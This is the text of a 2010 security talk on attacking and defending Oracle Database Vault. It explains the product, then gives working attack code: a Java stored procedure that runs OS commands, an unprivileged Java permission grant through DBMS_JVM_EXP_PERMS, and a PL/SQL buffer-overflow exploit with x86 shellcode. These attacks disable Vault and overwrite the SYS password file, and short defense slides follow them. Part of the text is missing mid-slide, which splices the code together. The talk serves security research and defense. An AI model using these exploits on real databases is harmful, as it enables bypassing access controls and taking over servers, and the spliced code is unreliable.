Hacking and protecting 
Oracle Database Vault  
Esteban Martínez Fayó 
Argeniss (www.argeniss.com) 
July 2010 
Agenda 
• Introduction to Oracle Database Vault 
 What is Oracle Database Vault, What changes introduce, Oracle 
Database Vault elements. 
• Attacks against Database Vault 
 Getting OS access 
 Impersonating MACSYS user 
 Special considerations for the SYS user 
o SQL Injection in SYS schema 
• Oracle Database Auditing and SYS user 
• Additional protection measures 
• Conclusions 
What is Oracle Database Vault? 
•
It’s an add-on to Oracle Database. 
•
Supported Oracle Database Releases: 9i R2, 10g R2, 11g R1 and 11g 
R2. 
•
“Oracle Database Vault can prevent highly privileged users, including 
powerful application DBAs and others, from accessing sensitive 
applications and data in Oracle databases outside their authorized 
responsibilities” 
 The DBA no longer has unlimited access to database data. 
 Helps protect against the insider threat and address regulatory 
compliance needs such as Sarbanes-Oxley (SOX) and PCI . 
•
The main goal of Oracle Database Vault  is to provide Separation of 
Duty 
What changes with Database Vault? 
•
Some initialization parameteres are changed to more secure values. 
•
RECYCLE BIN feature is disabled 
•
Revokes some privileges from default roles 
 DBA, IMP_FULL_DATABASE,  EXECUTE_CATALOG_ROLE, SCHEDULER_ADMIN and 
PUBLIC. 
•
Database audit is configured to include more actions, but auditing is 
not enabled. 
 Must issue ALTER SYSTEM SET AUDIT_TRAIL 
• SYS.AUD$ Table Moved to SYSTEM Schema. 
What changes with Database Vault? 
• SYS, SYSTEM and other schemas are protected as well as 
sensitive commands like ALTER USER. 
• Installing patches require to disable DBVault. 
•
DBVault can be disabled with OS access. 
 On Windows: Under %ORACLE_HOME%\bin, delete or rename 
oradv[release_number].dll (example: oradv10.dll, oradv11.dll) file. 
 On Linux: 
make -f $ORACLE_HOME/rdbms/lib/ins_rdbms.mk dv_off 
$ORACLE_HOME/bin/relink oracle 
What changes with Database Vault? 
•
In older releases: 
 OS authentication to the database is disabled. 
 Login “AS SYSDBA” blocked by default 
o SYS user can only log on “AS SYSOPER” 
o Some applications are incompatible with this: RMAN, Oracle RAC and some Oracle 
command line utilities. 
o Can be enabled with nosysdba=y parameter in orapwd program: 
$ORACLE_HOME/bin/orapwd file=$ORACLE_HOME/dbs/orapworcl force=y nosysdba=n 
password=anypass 
Database Vault Elements 
• Realms 
 Functional grouping of database schemas and roles that must be secured. 
For example, related to accounting or sales. 
 You can use the realm to control the use of system privileges to specific 
accounts or roles. 
• Factors 
 A factor is a named variable or attribute, such as a user location, database 
IP address, or session user. 
 Can be used for activities such as authorizing database accounts to 
connect to the database or creating filtering logic to restrict the visibility 
and manageability of data. 
Database Vault Elements 
• Command rules 
 Allows to control how users can execute many of the SQL statements. 
 Work with rule sets to determine whether or not the statement is allowed. 
• Rule sets 
 Collection of rules that you can associate with a realm authorization, 
command rule, factor assignment, or secure application role. 
 The rule set evaluates to true or false based on the evaluation of each 
rule. 
• Secure application roles 
 Special Oracle role that can be enabled based on the evaluation of a rule 
set. 
Database Vault Elements 
• Database Vault Schemas (Locked accounts by default): 
 DVSYS: Contains Oracle Database Vault objects (tables, views, PL/SQL 
packages, etc). 
It's secured by the 'Oracle Database Vault' realm. It guards the schema 
against improper use of system privileges like SELECT ANY TABLE, 
CREATE ANY VIEW, or DROP ANY …. 
 DVF: Owner of DBMS_MACSEC_FUNCTION. Contains the functions that 
retrieve factor identities. 
• Roles provided by Oracle Database Vault: 
 DV_OWNER, DV_REALM_OWNER, and DV_REALM_RESOURCE 
 DV_ADMIN, DV_ACCTMGR, and DV_PUBLIC 
 DV_SECANALYST 
Database Vault Elements 
• Typical Database Vault users: 
 MACACCT 
o Account for administration of database accounts and profiles. 
o Roles granted: DV_ACCTMGR 
 MACADMIN 
o Account to serve as the access control administrator. 
o Roles granted: DV_ADMIN 
 MACREPORT 
o Account for running Oracle Database Vault reports. 
o Roles granted: DV_SECANALYST 
 MACSYS 
o Account that is the realm owner for the DVSYS realm. 
o Roles granted: DV_OWNER 
• Database Vault Documentation contains a guideline to secure it 
 Documents security considerations with: 
o PL/SQL Packages: UTL_FILE, DBMS_FILE_TRANSFER, LogMiner Packages 
o Privileges: CREATE ANY JOB, CREATE JOB, CREATE EXTERNAL JOB, ALTER 
SYSTEM and ALTER SESSION 
o The Recycle Bin 
o Java Stored Procedures and External C Callouts (>', 'execute' ); 
EXEC dbms_java.grant_permission( 'ONEDBA', 
'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '' ); 
EXEC dbms_java.grant_permission( 'ONEDBA', 
'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '' ); 
OS access using Java (java_admin) - Attack 
• Create Java Source (requires CREATE PROCEDURE priv): 
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "SRC_EXECUTEOS" AS 
import java.lang.*; import java.io.*; 
public class ExecuteOS 
{ 
  public static void execOSCmd (String cmd) throws IOException, 
java.lang.InterruptedException 
  { 
    String[] strCmd = {"cmd.exe", "/c", cmd}; 
    Process p = Runtime.getRuntime().exec(strCmd); 
    p.waitFor(); 
  } 
}; 
/ 
OS access using Java (java_admin) - Attack 
• Create Java Stored procedure (requires CREATE PROCEDURE): 
CREATE OR REPLACE PROCEDURE "PROC_EXECUTEOS" (p_command varchar2) 
AS LANGUAGE JAVA 
NAME 'ExecuteOS.execOSCmd (java.lang.String)'; 
/ 
•
Execute OS commands: 
EXEC PROC_EXECUTEOS 
('C:\app\Administrator\product\11.2.0\dbhome_1\BIN\orapwd.exe 
file=C:\app\Administrator\product\11.2.0\dbhome_1\database\PWDorcl.ora 
force=y password=anypass nosysdba=n'); 
EXEC PROC_EXECUTEOS ('ren 
C:\app\Administrator\product\11.2.0\dbhome_1\BIN\oradv11.dll 
oradv11_.dll'); 
OS access using Java (java_admin) - Defense 
•
Restrict JAVA_ADMIN role. 
•
Remove Java support from Oracle database (if not needed). 
OS access using Java (no privs) - Attack 
• Grant Java privileges (no privs required): 
DECLARE 
  POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY; 
  CURSOR C1 IS SELECT 'GRANT','ONEUSER','SYS', 
'java.io.FilePermission','>','execute','ENABLED' FROM DUAL; 
BEGIN 
  OPEN C1; 
  FETCH C1 BULK COLLECT INTO POL;  
  CLOSE C1;  
  DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);  
END;  
/  
• Call oracle/aurora/util/Wrapper to execute OS commands: 
SELECT DBMS_JAVA_TEST.FUNCALL 
('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c',
'ren',' C:\\oracle\\product\\10.2.0\\db_1\BIN\\oradv10.dll','oradv10_.dll') 
FROM DUAL; 
OS access using Java (no privs) - Defense 
• Apply April 2010 CPU. 
• Oracle 11gR2 on Windows is not vulnerable. 
• Revoke privileges from users to execute DBMS_JVM_EXP_PERMS 
OS access using Buffer overflow - Attack 
• Requires EXECUTE privileges on a vulnerable procedure 
• DEMO: DIRPATH parameter of 
SYS.KUPF$FILE_INT.GET_FULL_FILENAME function is 
vulnerable to buffer overflow attacks 
 Patched in April 2008 Critical Patch Update 
OS access using Buffer overflow - Attack 
DECLARE 
  OS_COMMAND VARCHAR2(504); 
  RET_VALUE_X123 VARCHAR2(32767); 
  P_DIRPATH VARCHAR2(32767); 
BEGIN 
-- Disable DB Vault: 
  OS_COMMAND:='ren ..\bin\oradv10.dll oradv10_.dll'; 
-- Enable SYSDBA access and overwrite SYS password: 
--  OS_COMMAND:='..\bin\orapwd.exe file=..\dbs\orapworcl force=y nosysdba=n password=anypass'; 
  P_DIRPATH := ''  
   ||chr(54)||chr(141)||chr(67)||chr(19)             /* 36:8D43 13  LEA EAX,DWORD PTR SS:[EBX+13] */ 
   ||chr(80)                                         /* 50          PUSH EAX */ 
   ||chr(184)||chr(131)||chr(160)||chr(187)||chr(119)/* B8 83A0BB77 MOV EAX,msvcrt.system */ 
   ||chr(255) || chr(208)                            /* FFD0        CALL EAX */ 
   ||chr(184)||chr(31)||chr(179)||chr(188)||chr(119) /* B8 1FB3BC77 MOV EAX,msvcrt._endthread */ 
   ||chr(255) || chr(208)                            /* FFD0        CALL EAX */ 
   ||RPAD(OS_COMMAND || chr(38), 505) 
   ||CHR(96) || CHR(221) || CHR (171) || CHR(118);   /* EIP   0x76abdd60 - CALL EBX */ 